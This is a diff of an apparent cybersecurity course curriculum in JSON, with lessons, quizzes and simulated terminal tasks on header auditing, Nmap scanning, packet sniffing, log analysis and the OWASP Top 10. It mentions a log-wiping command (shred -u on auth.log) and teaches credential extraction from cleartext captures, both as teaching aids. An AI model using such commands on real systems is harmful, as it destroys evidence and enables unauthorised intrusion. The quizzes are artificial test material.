+        "term": "SSL Stripping",
+        "definition": "An attack where an adversary intercepts HTTP traffic and prevents the browser from upgrading to secure HTTPS."
+      },
+      {
+        "term": "Clickjacking",
+        "definition": "A visual deception attack where an attacker overlays transparent iframes over legitimate buttons to trick users into clicking unintended links."
+      },
+      {
+        "term": "Header Pipeline",
+        "definition": "Piping curl header queries directly into grep filter expressions to automate compliance checks."
+      }
+    ],
+    "diagramSvg": "<svg viewBox=\"0 0 600 160\" width=\"100%\" height=\"160\" xmlns=\"http://www.w3.org/2000/svg\" style=\"background:#0f172a;border-radius:8px;font-family:monospace;\">\n  <rect x=\"30\" y=\"30\" width=\"150\" height=\"100\" rx=\"8\" fill=\"#1e293b\" stroke=\"#38bdf8\" stroke-width=\"2\"/>\n  <text x=\"105\" y=\"70\" fill=\"#f8fafc\" font-size=\"13\" font-weight=\"bold\" text-anchor=\"middle\">Web Browser</text>\n  <text x=\"105\" y=\"95\" fill=\"#38bdf8\" font-size=\"11\" text-anchor=\"middle\">(Client)</text>\n\n  <!-- Request -->\n  <line x1=\"180\" y1=\"60\" x2=\"420\" y2=\"60\" stroke=\"#38bdf8\" stroke-width=\"2\"/>\n  <polygon points=\"420,60 410,55 410,65\" fill=\"#38bdf8\"/>\n  <text x=\"300\" y=\"52\" fill=\"#38bdf8\" font-size=\"11\" text-anchor=\"middle\">GET /login.html HTTP/1.1</text>\n\n  <!-- Response -->\n  <line x1=\"420\" y1=\"100\" x2=\"180\" y2=\"100\" stroke=\"#10b981\" stroke-width=\"2\"/>\n  <polygon points=\"180,100 190,95 190,105\" fill=\"#10b981\"/>\n  <text x=\"300\" y=\"118\" fill=\"#10b981\" font-size=\"11\" text-anchor=\"middle\">HTTP/1.1 200 OK (HTML Payload)</text>\n\n  <rect x=\"420\" y=\"30\" width=\"150\" height=\"100\" rx=\"8\" fill=\"#1e293b\" stroke=\"#10b981\" stroke-width=\"2\"/>\n  <text x=\"495\" y=\"70\" fill=\"#f8fafc\" font-size=\"13\" font-weight=\"bold\" text-anchor=\"middle\">Nginx Server</text>\n  <text x=\"495\" y=\"95\" fill=\"#10b981\" font-size=\"11\" text-anchor=\"middle\">Port 80 / 443</text>\n</svg>",
+    "lessons": [
+      {
+        "title": "1. Auditing the Staging Server",
+        "content": "In Lab 01, you evaluate Acme Finance's staging web server:\n\n1. Run `curl -I https://staging.acmefin.local` to inspect all returned headers.\n2. Check HSTS: `curl -I https://staging.acmefin.local | grep -i strict` (Returns no match because HSTS is missing!).\n3. Check Framing: `curl -I https://staging.acmefin.local | grep -i frame` (Missing X-Frame-Options!).\n4. Inspect Cookies: `curl -I https://staging.acmefin.local | grep -i set-cookie`.\n5. Read the hardened configuration: `cat /etc/nginx/conf.d/security.conf` to discover the security configuration flag!"
+      },
+      {
+        "title": "2. Browser-Enforced Security Policies",
+        "content": "HTTP security headers are instructions given by web servers to web browsers. Without `Strict-Transport-Security`, an active network adversary can perform SSL stripping to downgrade requests to unencrypted HTTP. Without `X-Frame-Options` (or `Content-Security-Policy: frame-ancestors`), attackers can embed the target application in an iframe to execute Clickjacking attacks. Auditing these headers with `curl -I` is a standard step in every web security assessment."
+      }
+    ],
+    "seeExamples": [
+      {
+        "title": "Auditing with curl Pipelines",
+        "codeOrDiagram": "cadet@endlessus:~$ curl -I https://staging.acmefin.local | grep -i strict\n(Empty - HSTS Missing!)\n\ncadet@endlessus:~$ cat /etc/nginx/conf.d/security.conf\nadd_header Strict-Transport-Security \"max-age=31536000; includeSubDomains\" always;\nadd_header X-Frame-Options \"DENY\" always;\n# FLAG: flag{strict_transport_security_csp}",
+        "explanation": "Auditing staging headers and reviewing the hardened Nginx configuration file."
+      }
+    ],
+    "tryInteractive": {
+      "type": "terminal",
+      "prompt": "Run `curl -I https://staging.acmefin.local | grep -i strict` to audit HSTS:",
+      "initialCommand": "",
+      "expectedCommand": "curl -I https://staging.acmefin.local | grep -i strict",
+      "simulatedOutput": "[!] Audit Check: Strict-Transport-Security header is MISSING on staging server.",
+      "explanation": "Executes header audit pipeline."
+    },
+    "questions": [
+      {
+        "id": "q-42-1",
+        "type": "exact",
+        "question": "What curl flag requests only the HTTP response headers, omitting the document body?",
+        "visualSlots": "- _",
+        "acceptedAnswers": [
+          "-I",
+          "--head"
+        ],
+        "caseSensitive": true,
+        "trimWhitespace": true,
+        "hint": "Capital letter I: -I.",
+        "explanation": "The `-I` flag tells curl to make a HEAD request and print response headers only."
+      },
+      {
+        "id": "q-42-2",
+        "type": "multiple-choice",
+        "question": "What is the primary security purpose of the Strict-Transport-Security (HSTS) header?",
+        "options": [
+          "It compresses HTML images using gzip",
+          "It forces web browsers to communicate exclusively over encrypted HTTPS, preventing SSL stripping downgrade attacks",
+          "It blocks SQL injection queries",
+          "It automatically deletes user cookies upon browser close"
+        ],
+        "correctIndex": 1,
+        "hint": "Forces HTTPS encryption.",
+        "explanation": "HSTS instructs browsers to strictly use HTTPS, permanently mitigating SSL stripping attacks."
+      }
+    ],
+    "tasks": [
+      {
+        "title": "Task 1: Run HSTS and X-Frame audit",
+        "instruction": "Open Lab 01 in the Practice Terminal to audit staging headers.",
+        "hints": [
+          "Type: `curl -I https://staging.acmefin.local | grep -i strict`",
+          "Type: `curl -I https://staging.acmefin.local | grep -i frame`",
+          "Type: `cat /etc/nginx/conf.d/security.conf`"
+        ]
+      }
+    ],
+    "securityConnection": "This lab directly maps to **Lab 01: HTTP Security Headers Hardening** (`lab-headers`), allowing you to practice real-world web server hardening and verify flags directly in the platform.",
+    "id": "room-42",
+    "nextRoomId": "room-43"
+  },
+  {
+    "stage": 7,
+    "level": 7,
+    "levelTitle": "Level 7 \u2014 First Practical Security Labs",
+    "title": "Network Service & Port Reconnaissance (Practical Lab 08)",
+    "difficulty": "Practical",
+    "difficultyBadge": "\ud83d\udd34 Practical",
+    "estimatedTime": "35 min",
+    "prerequisites": "Room 42: HTTP Security Headers Auditing",
+    "whyAreYouHere": "Before an ethical hacker can test a server, they must discover what ports and services are listening across the network. Running an Nmap scan reveals open doors (SSH on port 22, web on port 80, SMB on port 445). Connecting to those ports allows you to grab service version banners and enumerate unauthenticated anonymous shares. In this room, you will perform active network reconnaissance.",
+    "objectives": [
+      "Perform an active network port scan using `nmap -sS -sV 10.10.20.15`",
+      "Scan specific target ports using `nmap -sV -p 21 10.10.20.15`",
+      "Perform banner grabbing using `nc -vn 10.10.20.15 21` to identify service versions",
+      "Enumerate anonymous SMB network shares using `smbclient -L //10.10.20.15 -N`",
+      "Download exposed files and submit the network lab flag"
     ],
     "vocabulary": [
       {
         "term": "Nmap (Network Mapper)",
-        "definition": "An open-source network scanner used to discover hosts, open ports, running services, and operating systems on a network."
+        "definition": "The industry-standard open-source network scanner used for network discovery and vulnerability assessment."
       },
       {
-        "term": "SYN Stealth Scan (`-sS`)",
-        "definition": "A default Nmap scan that sends SYN packets and tears down the connection with RST upon receiving SYN-ACK, avoiding full session completion."
+        "term": "SYN Scan (-sS)",
+        "definition": "A fast, stealthy port scanning technique that sends SYN packets and measures responses without completing the full TCP handshake."
       },
       {
-        "term": "Connect Scan (`-sT`)",
-        "definition": "An unprivileged TCP scan that completes the full 3-way handshake via the operating system's `connect()` system call."
+        "term": "Version Detection (-sV)",
+        "definition": "An Nmap scan feature that probes open ports to determine the exact software name and version number running."
       },
-      {
-        "term": "Version Detection (`-sV`)",
-        "definition": "Nmap sends protocol-specific probes to listening ports to determine the exact software product and version (e.g. Apache 2.4.52)."
-      },
-      {
-        "term": "NSE (Nmap Scripting Engine)",
-        "definition": "A Lua-based scripting framework that allows Nmap to automate vulnerability detection, brute forcing, and advanced enumeration."
-      }
-    ],
-    "lessons": [
-      {
-        "title": "1. The Anatomy of an Nmap Scan",
-        "content": "A standard professional Nmap command:\n```bash\nnmap -sC -sV -p- -T4 -oN target_scan.txt 10.10.10.25\n```\n• `-sC`: Runs default safe NSE enumeration scripts.\n• `-sV`: Interrogates open ports to extract service banners and software versions.\n• `-p-`: Scans all 65,535 ports (instead of just the top 1,000 defaults).\n• `-T4`: Sets aggressive timing template (faster scanning).\n• `-oN`: Saves output to a normal text file for your pentest report.\n• `10.10.10.25`: The target host IP."
-      },
-      {
-        "title": "2. Port States: Open, Closed, Filtered",
-        "content": "• **Open**: Target replied with `SYN-ACK`. An active service is accepting connections.\n• **Closed**: Target replied with `RST` (Reset). The host is alive, but no program is listening on that port.\n• **Filtered**: No response received (or ICMP unreachable). A firewall dropped or blocked your probe."
-      }
-    ],
-    "seeExamples": [
-      {
-        "title": "Sample Nmap Output Breakdown",
-        "codeOrDiagram": "Starting Nmap 7.94 ( https://nmap.org )\nNmap scan report for 10.10.10.25\nHost is up (0.0021s latency).\nPORT     STATE SERVICE VERSION\n22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)\n80/tcp   open  http    Apache httpd 2.4.52 ((Ubuntu))\n|_http-server-header: Apache/2.4.52 (Ubuntu)\n|_http-title: Corporate Intranet Portal\n445/tcp  open  netbios Samba smbd 4.6.2",
-        "explanation": "Notice the detail: Nmap reveals exact software versions (OpenSSH 8.9p1, Apache 2.4.52, Samba 4.6.2). These versions can be looked up in vulnerability databases!"
-      }
-    ],
-    "tryInteractive": {
-      "type": "terminal",
-      "prompt": "Run an Nmap service version scan against lab target `10.10.10.25` using `nmap -sV -p 22,80,445 10.10.10.25`:",
-      "initialCommand": "",
-      "expectedCommand": "nmap -sV -p 22,80,445 10.10.10.25",
-      "simulatedOutput": "Starting Nmap 7.94\nNmap scan report for 10.10.10.25\nPORT    STATE SERVICE VERSION\n22/tcp  open  ssh     OpenSSH 8.9p1 Ubuntu\n80/tcp  open  http    Apache httpd 2.4.52\n445/tcp open  smb     Samba smbd 4.6.2\nService Info: OS: Linux\n[+] Success! Target services fingerprinted.",
-      "explanation": "Nmap sent protocol probes and matched banners against its fingerprint database (`nmap-service-probes`)."
-    },
-    "questions": [
-      {
-        "id": "r20-q1",
-        "type": "multiple-choice",
-        "question": "Why is an Nmap TCP SYN scan (`-sS`) often referred to as a 'Stealth' or 'Half-Open' scan?",
-        "options": [
-          "It uses AES encryption to hide packets from routers",
-          "It sends a RST packet immediately upon receiving a SYN-ACK, closing the connection before the target application layer logs a completed session",
-          "It changes the MAC address of the target server",
-          "It only scans closed ports"
-        ],
-        "correctIndex": 1,
-        "explanation": "Because the 3-way handshake is never completed, older application firewalls did not log the event in service connection logs."
-      },
-      {
-        "id": "r20-q2",
-        "type": "multiple-choice",
-        "question": "When Nmap reports a port state as 'Filtered', what does this indicate?",
-        "options": [
-          "The port is running a web filter proxy",
-          "A firewall or packet filter is dropping probes, preventing Nmap from determining if the port is open or closed",
-          "The port is definitely open and running an FTP service",
-          "The target machine is turned off"
-        ],
-        "correctIndex": 1,
-        "explanation": "Filtered means Nmap received no reply, typically because a firewall dropped the probe silently."
-      }
-    ],
-    "tasks": [
-      {
-        "title": "Task 1: Perform Version Enumeration",
-        "instruction": "Execute `nmap -sV -p 22,80,445 10.10.10.25` against the lab host to fingerprint active services.",
-        "hints": [
-          "Concept: Service version scanning.",
-          "Direction: Specify `-sV` and target ports.",
-          "Tool: `nmap`",
-          "Syntax: `nmap -sV -p 22,80,445 10.10.10.25`",
-          "Explanation: Returns version fingerprints."
-        ]
-      }
-    ],
-    "explainResult": "Nmap generated custom Layer 4 probes, analyzed banner responses, and calculated fingerprint hashes to accurately match Apache 2.4.52 and Samba 4.6.2.",
-    "securityConnection": "Enumeration is the foundation of exploitation. Once you know the exact version (e.g. Samba 4.6.2), you can query CVE databases and Searchsploit to discover known Remote Code Execution (RCE) exploits for that version.",
-    "practicalRoomLink": {
-      "label": "Ready for hands-on practice?",
-      "buttonText": "Open Practical Network Recon & Port Scanning Lab",
-      "url": "labs.html?lab=nmap"
-    },
-    "completion": {
-      "learned": [
-        "How Nmap discovers open ports and running services",
-        "The difference between SYN stealth scans and TCP connect scans",
-        "Service version fingerprinting using `-sV`",
-        "The meaning of Open, Closed, and Filtered port states"
-      ],
-      "practiced": [
-        "nmap -sV -p 22,80,445 10.10.10.25",
-        "Interpreting port tables",
-        "Evaluating firewall filtering behaviors"
-      ]
-    },
-    "nextRoomId": "room-21"
-  },
-  {
-    "id": "room-21",
-    "stage": 5,
-    "stageTitle": "Stage 5 — Security Tools",
-    "title": "Wireshark & Packet Analysis",
-    "difficulty": "Intermediate",
-    "difficultyBadge": "🟣 Intermediate",
-    "estimatedTime": "35 min",
-    "prerequisites": "Room 09 (TCP/IP & Packets) & Room 20 (Nmap)",
-    "whyAreYouHere": "A doctor uses an X-ray to look inside a human body; a cybersecurity analyst uses **Wireshark** to look inside network traffic. Wireshark is the world's most widely used network protocol analyzer. In this room, you will learn how to capture raw packets, apply display filters to isolate suspicious activity, follow TCP conversations, and extract unencrypted passwords from cleartext traffic.",
-    "objectives": [
-      "Understand Packet Capture (PCAP) and how network sniffers work",
-      "Learn the Wireshark 3-pane interface: Packet List, Packet Details, and Packet Bytes",
-      "Master Wireshark Display Filters (`ip.addr == ...`, `http`, `tcp.port == ...`)",
-      "Follow TCP Streams to reconstruct full conversational transcripts",
-      "Identify plaintext credentials and security leaks in network captures"
-    ],
-    "vocabulary": [
-      {
-        "term": "Wireshark",
-        "definition": "A graphical network packet analyzer used for network troubleshooting, protocol analysis, and security auditing."
-      },
-      {
-        "term": "PCAP (Packet Capture)",
-        "definition": "The standard file format (usually `.pcap` or `.pcapng`) containing raw network data frames recorded from a network interface."
-      },
-      {
-        "term": "Promiscuous Mode",
-        "definition": "A network card configuration that causes the controller to pass all incoming traffic to the CPU, not just frames addressed to its own MAC."
-      },
-      {
-        "term": "Display Filter",
-        "definition": "An expression syntax used inside Wireshark to filter visible packets based on protocols, IP addresses, ports, or content."
-      },
-      {
-        "term": "Follow TCP Stream",
-        "definition": "A Wireshark feature that reassembles all out-of-order packets of a session into a continuous readable text stream."
-      }
-    ],
-    "lessons": [
-      {
-        "title": "1. Essential Wireshark Display Filters",
-        "content": "A raw capture can contain millions of packets. Filters let you find needles in the haystack:\n• `ip.addr == 10.10.10.25`: Shows only packets where the source OR destination is 10.10.10.25.\n• `tcp.port == 80`: Shows web traffic.\n• `http.request.method == \"POST\"`: Shows login submissions and form posts!\n• `dns`: Filters only domain name queries and answers.\n• `frame contains \"password\"`: Searches the entire payload of all packets for the keyword 'password'."
-      },
-      {
-        "title": "2. Following the TCP Stream",
-        "content": "Instead of reading hundreds of individual 1,500-byte packets, right-click any packet and select **Follow -> TCP Stream**.\nWireshark reassembles all sequence numbers, strips headers, and displays the exact dialogue:\n• **Red text**: Data sent by the client.\n• **Blue text**: Data returned by the server."
-      }
-    ],
-    "seeExamples": [
-      {
-        "title": "Wireshark Packet Stream Reconstruction",
-        "codeOrDiagram": "[ Client Stream - RED ]\nPOST /login.php HTTP/1.1\nHost: internal-portal.corp\nContent-Type: application/x-www-form-urlencoded\n\nusername=administrator&password=SuperSecretPassword2026!\n\n[ Server Stream - BLUE ]\nHTTP/1.1 302 Found\nLocation: /admin/dashboard.php\nSet-Cookie: PHPSESSID=991a0c8b21ef",
-        "explanation": "Because HTTP was unencrypted, Wireshark reconstructed the administrator's password in plain clear text."
-      }
-    ],
-    "tryInteractive": {
-      "type": "terminal",
-      "prompt": "Simulate packet capture analysis using `tcpdump` to capture 3 HTTP packets with ASCII payload on loopback interface: `tcpdump -i lo -c 3 -A port 8080`:",
-      "initialCommand": "",
-      "expectedCommand": "tcpdump -i lo -c 3 -A port 8080",
-      "simulatedOutput": "tcpdump: verbose output suppressed, listening on lo\n16:36:01.102 IP 127.0.0.1.54320 > 127.0.0.1.8080: Flags [P.], seq 1:92, ack 1\nE..h..@.@.....\nPOST /api/auth HTTP/1.1..Host: localhost..user=cadet&token=lab_pcap_key_88\n[+] Success! 3 packets captured and ASCII payload rendered.",
-      "explanation": "`tcpdump -A` is the command-line equivalent of Wireshark, printing payload bytes as readable ASCII text."
-    },
-    "questions": [
-      {
-        "id": "r21-q1",
-        "type": "multiple-choice",
-        "question": "Which Wireshark display filter will show only HTTP requests where the client submitted data using the POST method?",
-        "options": [
-          "http.request.method == \"POST\"",
-          "post.traffic == true",
-          "tcp.method == POST",
-          "ip.proto == http_post"
-        ],
-        "correctIndex": 0,
-        "explanation": "`http.request.method == \"POST\"` filters the capture down to HTTP POST requests."
-      },
-      {
-        "id": "r21-q2",
-        "type": "multiple-choice",
-        "question": "When inspecting an HTTPS capture in Wireshark without possessing the server's private cryptographic key, what will the packet payload show?",
-        "options": [
-          "Plaintext HTML documents",
-          "Unencrypted passwords",
-          "Opaque, encrypted ciphertext application data that cannot be read",
-          "Cleartext SQL queries"
-        ],
-        "correctIndex": 2,
-        "explanation": "Because HTTPS uses TLS encryption, third-party packet sniffers only see encrypted application data."
-      }
-    ],
-    "tasks": [
-      {
-        "title": "Task 1: Capture Loopback HTTP Packet Stream",
-        "instruction": "Execute `tcpdump -i lo -c 3 -A port 8080` to inspect live packets passing over the local loopback interface.",
-        "hints": [
-          "Concept: Command-line packet sniffer.",
-          "Direction: Use flags `-i` (interface), `-c` (count), `-A` (ASCII).",
-          "Tool: `tcpdump`",
-          "Syntax: `tcpdump -i lo -c 3 -A port 8080`",
-          "Explanation: Dumps 3 packets in ASCII."
-        ]
-      }
-    ],
-    "explainResult": "The `tcpdump` engine configured the AF_PACKET raw socket interface in the kernel to tap incoming frames before delivery to the TCP stack.",
-    "securityConnection": "Packet analysis is used in malware reverse engineering, network threat hunting, and data exfiltration detection. Attackers often transmit sensitive stolen files over DNS tunnels or ICMP packets; network defenders detect these covert channels using Wireshark.",
-    "practicalRoomLink": {
-      "label": "Ready for hands-on practice?",
-      "buttonText": "Open Practical Packet Inspection Lab",
-      "url": "labs.html?lab=packets"
-    },
-    "completion": {
-      "learned": [
-        "How packet sniffers capture network frames using promiscuous mode",
-        "Wireshark interface layout and PCAP file structures",
-        "Writing effective display filters (ip.addr, tcp.port, http.request.method)",
-        "Following TCP streams to extract plaintext credentials"
-      ],
-      "practiced": [
-        "tcpdump -i lo -c 3 -A port 8080",
-        "Inspecting raw packet payloads",
-        "Analyzing packet stream transcripts"
-      ]
-    },
-    "nextRoomId": "room-22"
-  },
-  {
-    "id": "room-22",
-    "stage": 5,
-    "stageTitle": "Stage 5 — Security Tools",
-    "title": "Logs & Security Event Analysis",
-    "difficulty": "Foundation",
-    "difficultyBadge": "🔵 Foundation",
-    "estimatedTime": "30 min",
-    "prerequisites": "Room 19 (Linux Toolkit)",
-    "whyAreYouHere": "Every single time an attacker enters a system, types a bad password, downloads a file, or crashes a service, the computer leaves a digital footprint: a **Log Entry**. Cybersecurity analysts in Security Operations Centers (SOCs) spend their careers investigating these logs to catch attackers before data is stolen. In this room, you will learn the format of system and web logs, how to spot brute-force attacks, and how to correlate events across multiple systems.",
-    "objectives": [
-      "Understand the purpose of system logging and the Syslog standard",
-      "Learn the location and structure of Linux logs (`/var/log/auth.log`, `syslog`, `nginx/access.log`)",
-      "Dissect web server Combined Access Log formats (IP, Timestamp, Method, URI, Status, User-Agent)",
-      "Detect brute-force password attacks and web scanning activity from log artifacts",
-      "Correlate events using timestamps and source IP addresses"
-    ],
-    "vocabulary": [
-      {
-        "term": "Log File",
-        "definition": "A chronological record of events, operations, and transactions generated by operating systems, services, and applications."
-      },
-      {
-        "term": "Syslog",
-        "definition": "A standardized protocol and architecture for logging system messages on Unix and Linux systems."
-      },
-      {
-        "term": "auth.log / secure",
-        "definition": "The system log file recording all authentication events, user logins, sudo executions, and SSH connection attempts."
-      },
-      {
-        "term": "SIEM",
-        "definition": "Security Information and Event Management: enterprise software that aggregates, correlates, and analyzes logs from hundreds of servers."
-      },
-      {
-        "term": "Log Correlation",
-        "definition": "The analytical process of linking related events across multiple systems to reconstruct an adversary's complete attack timeline."
-      }
-    ],
-    "lessons": [
-      {
-        "title": "1. The Web Server Access Log Format",
-        "content": "Web servers like Apache and Nginx record every single incoming request:\n```text\n192.168.1.105 - - [05/Oct/2026:16:30:45 +0000] \"GET /admin.php HTTP/1.1\" 404 196 \"-\" \"Nikto/2.1.6\"\n```\n• **IP**: `192.168.1.105` (Who sent the request).\n• **Timestamp**: `05/Oct/2026:16:30:45`.\n• **Request**: `GET /admin.php HTTP/1.1`.\n• **Status Code**: `404` (Not Found).\n• **User-Agent**: `Nikto/2.1.6` (Dead giveaway: this is an automated vulnerability scanner!)."
-      },
-      {
-        "title": "2. Spotting an SSH Brute-Force Attack",
-        "content": "When someone launches a dictionary attack against SSH, `/var/log/auth.log` fills with repeated failures:\n```text\nOct 5 16:32:01 server sshd[1420]: Failed password for root from 203.0.113.88 port 48122 ssh2\nOct 5 16:32:02 server sshd[1422]: Failed password for admin from 203.0.113.88 port 48124 ssh2\nOct 5 16:32:03 server sshd[1424]: Failed password for user from 203.0.113.88 port 48126 ssh2\nOct 5 16:32:05 server sshd[1426]: Accepted password for support from 203.0.113.88 port 48128 ssh2\n```\nNotice: 3 rapid failed attempts followed by an accepted password on line 4! The attacker guessed the password for `support`."
-      }
-    ],
-    "seeExamples": [
-      {
-        "title": "Analyzing Web Scanner Logs with awk and sort",
-        "codeOrDiagram": "cadet@endlessus:~$ awk '{print $1}' access.log | sort | uniq -c | sort -nr\n   1420 192.168.1.105   <-- Sent 1,420 requests in 30 seconds!\n     12 10.0.0.4\n      4 10.0.0.8",
-        "explanation": "Piping awk, sort, and uniq counts requests per IP, immediately exposing aggressive vulnerability scanners and denial-of-service bots."
-      }
-    ],
-    "tryInteractive": {
-      "type": "terminal",
-      "prompt": "Find the top IP addresses sending requests in our lab web log using `awk '{print $1}' /var/log/nginx/access.log | sort | uniq -c | sort -nr`:",
-      "initialCommand": "",
-      "expectedCommand": "awk '{print $1}' /var/log/nginx/access.log | sort | uniq -c | sort -nr",
-      "simulatedOutput": "   1842 192.168.1.99\n     24 10.10.10.5\n      3 127.0.0.1\n[+] Success! Attacker IP 192.168.1.99 identified with 1,842 requests.",
-      "explanation": "A single IP sending thousands of requests in seconds indicates automated directory fuzzing or vulnerability scanning."
-    },
-    "questions": [
-      {
-        "id": "r22-q1",
-        "type": "multiple-choice",
-        "question": "In standard Linux systems, which log file records SSH connection attempts, failed logins, and sudo command invocations?",
-        "options": [
-          "/var/log/auth.log (or /var/log/secure)",
-          "/var/log/dpkg.log",
-          "/etc/resolv.conf",
-          "/tmp/session.log"
-        ],
-        "correctIndex": 0,
-        "explanation": "`/var/log/auth.log` (on Debian/Ubuntu) and `/var/log/secure` (on RHEL/CentOS) log authentication activity."
-      },
-      {
-        "id": "r22-q2",
-        "type": "multiple-choice",
-        "question": "When auditing web server logs, why is the `User-Agent` string valuable for detecting automated attacks?",
-        "options": [
-          "It encrypts the database server",
-          "Automated vulnerability scanners (like sqlmap, Nikto, or Gobuster) often advertise their tool name in the default User-Agent header",
-          "It provides the user's home Wi-Fi password",
-          "It changes the client's MAC address"
-        ],
-        "correctIndex": 1,
-        "explanation": "Unless customized, tools like sqlmap or Nikto identify themselves directly in the User-Agent header, making detection straightforward."
-      }
-    ],
-    "tasks": [
-      {
-        "title": "Task 1: Isolate High-Frequency Request IP",
-        "instruction": "Run `awk '{print $1}' /var/log/nginx/access.log | sort | uniq -c | sort -nr` to isolate the attacker's IP.",
-        "hints": [
-          "Concept: Log aggregation and frequency counting.",
-          "Direction: Pipe awk to sort and uniq.",
-          "Tool: `awk`, `sort`, `uniq`",
-          "Syntax: Run the complete command string.",
-          "Explanation: Reveals anomalous volume."
-        ]
-      }
-    ],
-    "explainResult": "The pipeline parsed field 1 (client IP), sorted the list, grouped identical values with frequency counts, and sorted in reverse numerical order.",
-    "securityConnection": "Log analysis bridges offensive and defensive cybersecurity. Attackers attempt to clear logs (`shred -u /var/log/auth.log`) to hide their tracks. In response, modern enterprises forward logs in real-time to write-once, append-only SIEM systems so evidence cannot be deleted!",
-    "completion": {
-      "learned": [
-        "The purpose of system and application logging",
-        "The location and formatting of `/var/log/auth.log` and web access logs",
-        "How to detect brute-force attacks and scanner fingerprints",
-        "Using shell utilities (`awk`, `sort`, `uniq`) for incident triage"
-      ],
-      "practiced": [
-        "awk '{print $1}' /var/log/nginx/access.log | sort | uniq -c",
-        "Carving attacker IP addresses",
-        "Correlating security events"
-      ]
-    },
-    "nextRoomId": "room-23"
-  },
-  {
-    "id": "room-23",
-    "stage": 6,
-    "stageTitle": "Stage 6 — Web Security",
-    "title": "Web Security Fundamentals & OWASP Top 10",
-    "difficulty": "Foundation",
-    "difficultyBadge": "🔵 Foundation",
-    "estimatedTime": "30 min",
-    "prerequisites": "Stage 3 (How the Web Works) & Stage 4 (Cybersecurity Fundamentals)",
-    "whyAreYouHere": "You now understand HTTP, headers, cookies, and network protocols. Now you are ready to study how web applications break. Web applications are the primary target for attackers because they sit open to the entire world on ports 80 and 443. In this room, you will learn the fundamental principle of web security: **Never Trust User Input**, and explore the global benchmark: the OWASP Top 10.",
-    "objectives": [
-      "Understand the Three-Tier Web Application Architecture (Presentation, Application, Database)",
-      "Master the Core Security Axiom: Never Trust Client-Side Input",
-      "Understand Input Validation vs Output Encoding",
-      "Explore the OWASP Top 10 framework and its top categories",
-      "Audit an insecure input form parameter in the lab"
-    ],
-    "vocabulary": [
-      {
-        "term": "OWASP",
-        "definition": "Open Web Application Security Project: a global nonprofit dedicated to improving the security of software through open standards and educational resources."
-      },
-      {
-        "term": "OWASP Top 10",
-        "definition": "A regularly updated consensus report ranking the ten most critical security risks facing web applications worldwide."
-      },
-      {
-        "term": "Input Validation",
-        "definition": "The security practice of verifying that all incoming client data matches expected formats, lengths, and character sets before processing."
-      },
-      {
-        "term": "Output Encoding",
-        "definition": "Transforming untrusted user input before rendering it into HTML/JS so the browser interprets it as data, not executable code."
-      },
-      {
-        "term": "Attack Vector",
-        "definition": "A path or means by which an attacker can gain access to a computer or network server to deliver a malicious outcome."
-      }
-    ],
-    "lessons": [
-      {
-        "title": "1. The Cardinal Rule: Never Trust the Client",
-        "content": "Many novice developers validate form inputs using HTML or JavaScript in the user's browser:\n```html\n<input type=\"number\" min=\"1\" max=\"100\" name=\"quantity\">\n```\nAn attacker does not use a browser! They use **curl** or **Burp Suite** to bypass the browser entirely, sending:\n```http\nPOST /order HTTP/1.1\nquantity=-99999\n```\nBecause client-side validation is completely under the attacker's control, **all validation must occur on the server**!"
-      },
-      {
-        "title": "2. The OWASP Top 10 Landscape",
-        "content": "The OWASP Top 10 provides the vocabulary for modern application security:\n1. **Broken Access Control**: Users accessing other users' records or admin portals.\n2. **Cryptographic Failures**: Weak algorithms, plaintext sensitive data.\n3. **Injection**: SQL injection, command injection, LDAP injection.\n4. **Insecure Design**: Fundamental architectural flaws.\n5. **Security Misconfiguration**: Default passwords, open cloud buckets, debugging enabled.\n6. **Vulnerable and Outdated Components**: Using old libraries with known CVEs.\n7. **Identification and Authentication Failures**: Brute-force, missing MFA, session flaws.\n8. **Software and Data Integrity Failures**: Insecure CI/CD pipelines and untrusted updates.\n9. **Security Logging and Monitoring Failures**: Inability to detect active breaches.\n10. **Server-Side Request Forgery (SSRF)**: Tricking a server into accessing internal resources."
-      }
-    ],
-    "seeExamples": [
-      {
-        "title": "Client-Side vs Server-Side Validation Flow",
-        "codeOrDiagram": "[ Attacker with Burp Suite / curl ]\n                ↓ Bypasses browser JavaScript restrictions completely!\n[ Malicious Payload: quantity=-50&price=0.01 ]\n                ↓\n[ Web Server Backend: MUST validate input on server! ]\n   ├── IF invalid: Reject with HTTP 400 Bad Request\n   └── IF valid: Sanitize, parameterize, and execute safely",
-        "explanation": "Never rely on browser HTML5 or JavaScript validation for security. Always enforce validation on the backend server."
-      }
-    ],
-    "tryInteractive": {
-      "type": "terminal",
-      "prompt": "Simulate bypassing a client-side quantity limit by sending an arbitrary HTTP POST payload directly to the server with curl: `curl -d \"item=sword&qty=-100\" http://localhost:8080/cart/add`:",
-      "initialCommand": "",
-      "expectedCommand": "curl -d \"item=sword&qty=-100\" http://localhost:8080/cart/add",
-      "simulatedOutput": "HTTP/1.1 200 OK\n{\"cart\":[{\"item\":\"sword\",\"qty\":-100,\"total\":-5000}],\"warning\":\"Server failed to validate negative integer!\"}\n[+] Success! Negative quantity accepted because the server relied on client-side HTML checks.",
-      "explanation": "Directly transmitting crafted HTTP parameters demonstrates why backend validation is strictly required."
-    },
-    "questions": [
-      {
-        "id": "r23-q1",
-        "type": "multiple-choice",
-        "question": "Why is HTML5 or JavaScript input validation running inside the user's browser completely insufficient for preventing web attacks?",
-        "options": [
-          "Because HTML5 is only supported on mobile devices",
-          "Because attackers can bypass the browser entirely by sending raw HTTP requests using tools like curl, Python, or Burp Suite",
-          "Because JavaScript cannot process alphanumeric characters",
-          "Because servers automatically disable client scripts"
-        ],
-        "correctIndex": 1,
-        "explanation": "The client environment is entirely controlled by the user. An attacker can craft any raw HTTP request they desire, bypassing all browser validation."
-      },
-      {
-        "id": "r23-q2",
-        "type": "multiple-choice",
-        "question": "Which OWASP Top 10 category covers flaws where an attacker tampers with a URL parameter like `?user_id=105` to view another customer's private account?",
-        "options": [
-          "Broken Access Control",
-          "Cryptographic Failures",
-          "Security Misconfiguration",
-          "Software Integrity Failure"
-        ],
-        "correctIndex": 0,
-        "explanation": "Failing to verify whether the logged-in user has permission to access the requested object is a Broken Access Control flaw (specifically IDOR)."
-      }
-    ],
-    "tasks": [
-      {
-        "title": "Task 1: Test Server-Side Input Boundaries",
-        "instruction": "Send `curl -d \"item=sword&qty=-100\" http://localhost:8080/cart/add` to test backend validation.",
-        "hints": [
-          "Concept: Parameter tampering via curl.",
-          "Direction: Submit negative quantity value.",
-          "Tool: `curl`",
